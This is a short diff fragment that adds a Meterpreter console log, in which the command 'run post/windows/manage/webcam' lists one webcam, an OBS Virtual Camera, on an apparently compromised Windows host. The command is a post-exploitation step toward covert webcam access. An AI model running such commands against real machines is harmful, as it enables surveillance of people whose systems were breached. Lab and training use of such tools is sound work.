@@ -1,0 +1,8 @@
+meterpreter > run post/windows/manage/webcam
+
+Webcam List
+===========
+
+ Index  Name
+ -----  ----
+ 1      OBS Virtual Camera
